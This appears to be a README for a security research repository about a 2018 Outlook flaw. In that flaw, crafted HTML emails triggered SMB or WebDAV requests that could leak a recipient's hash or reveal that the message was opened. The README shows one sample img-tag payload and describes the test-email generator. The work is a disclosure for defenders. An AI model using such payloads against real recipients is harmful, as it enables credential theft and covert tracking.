# The Outlook HTML Leak Test Project!

## Blog post:

https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/

## What's in "./Schemes-List.xlsx"?

List of URI schemes that might work in Windows. These schemes/protocols can be useful in similar research to find new vulnerabilities or to bypass current protections. Other products might be affected similarly but it has not been researched here.

It is interesting that opening this file using MS Office takes longer than usual that may suggest Excel is doing something on some of them. This is a great sign to find bugs/features!

## What's in "./OutlookMailApp/OutlookMailApp/resources/template.html"?

List of HTML tags that might send requests to other resources automatically or by user interaction.
This file has been generated based on the following sources:
* https://github.com/cure53/HTTPLeaks
* https://stackoverflow.com/questions/2725156/complete-list-of-html-tag-attributes-which-have-a-url-value


## Research and the Tales:

While I was working on an assessment, I received an HTML email in Outlook 2010 that contained an image tag similar to:
```
<img src="//example.com/test/image.jpg" >
```

I could see that Outlook was searching for something after opening that email and it took longer than usual to fully open it. I quickly realised that Outlook actually used the URL as `\\example.com\test\image.jpg` and sent `example.com` a SMB request.

Although it did not load the image even when the provided SMB path was valid, it could send my SMB hash to an arbitrary location. This attack did not work on Outlook 2016, however it made me start a small research project in trying different HTML tags that accept URIs with different URI schemes and special payloads.

I managed to test a list of known URI schemes with different targets by designing a quick (and dirty) ASP.NET application that used ASPOSE.Email (https://downloads.aspose.com/email/net) and Microsoft Office Interop libraries. This application generates readonly MSG files similar to the received or sent emails in Outlook. 
The cure53 HTTPLeaks project (https://github.com/cure53/HTTPLeaks) with minor changes was used as the HTML template to generate the emails. The dirty C# code, URI Schemes, formulas, and the HTML template used in this research can be found on this repository.

In order to reduce complications, Wireshark and Process Monitor of Sysinternals Suite were used to detect remote and local filesystem calls.

## Discovered Vulnerability in Outlook

Outlook sent external SMB/WebDAV requests upon opening a crafted HTML email. This could be abused to hijack a victim’s SMB hash or to determine if the recipient had viewed a message. 
This issue was exploited using Outlook default settings that blocked loading external resources such as image files.
These requests were sent immediately after opening an email. When SMB port was blocked, a WebDAV request on port 80 was sent. For more details and the fix, please refer to https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/may/smb-hash-hijacking-and-user-tracking-in-ms-outlook/

### Identified payloads:

#### Remote Calls:
Although the `\\` pattern was blocked by Outlook, a number of other patterns and URI schemes were found that forced Outlook to send requests to remote servers.
The following table shows the identified vectors:

![Outlook Remote Calls](https://github.com/nccgroup/OutlookLeakTest/blob/master/images/remotecalls.png?raw=true)

#### Local Filesystem Calls:
The following URI schemes could also be used target the local filesystem that might be useful:

![Outlook Local Filesystem Calls](https://github.com/nccgroup/OutlookLeakTest/blob/master/images/localfscalls.png?raw=true)


## Copyright and License
OutlookLeakTest project is copyright 2018, NCC Group, and licensed under the Apache license (see LICENSE).
